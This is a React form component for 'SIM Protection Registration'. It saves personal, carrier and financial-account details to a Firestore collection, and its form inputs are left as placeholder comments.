import { useState } from "react";
import { Card, CardContent } from "../ui/card";
import { Button } from "../ui/button";
import { Input } from "../ui/input";
import { Checkbox } from "../ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../ui/select";
import { db } from "../../firebase"; // make sure this points to your Firebase setup
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import toast, { Toaster } from "react-hot-toast";

export default function FraudProtectionForm({ onSuccess }) {
    const [form, setForm] = useState({
        fullName: "",
        dob: "",
        idNumber: "",
        email: "",
        phoneNumbers: "",
        carrier: "",
        simType: "",
        simDate: "",
        carrierPin: "",
        banks: "",
        insurers: "",
        paymentApps: "",
        otherAccounts: "",
        alertMethod: "",
        defaultAction: "",
        recovery: "",
        language: "",
        country: "",
        consent: false,
        emergencyContact: ""
    });

    const handleChange = (e) => {
        const { name, value, type, checked } = e.target;
        setForm({
            ...form,
            [name]: type === "checkbox" ? checked : value,
        });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            await addDoc(collection(db, "simProtections"), {
                ...form,
                createdAt: serverTimestamp(),
            });
            toast.success("SIM Protection registered successfully!");
            onSuccess(); // move to success screen
        } catch (err) {
            console.error(err);
            toast.error("Failed to register. Try again.");
        }
    };

    return (
        <div className="flex items-center justify-center min-h-screen bg-gray-100 w-full">
            <Toaster position="top-right" />
            <Card className="w-full max-w-3xl shadow-xl rounded-2xl">
                <CardContent className="p-6 space-y-6">
                    <h2 className="text-2xl font-bold text-center text-gray-800">
                        SIM Protection Registration
                    </h2>
                    <form onSubmit={handleSubmit} className="space-y-6">
                        {/* form inputs as you already defined */}
                        {/* ... keep your existing form structure ... */}

                        <Button type="submit" className="w-full">
                            Register
                        </Button>
                    </form>
                </CardContent>
            </Card>
        </div>
    );
}
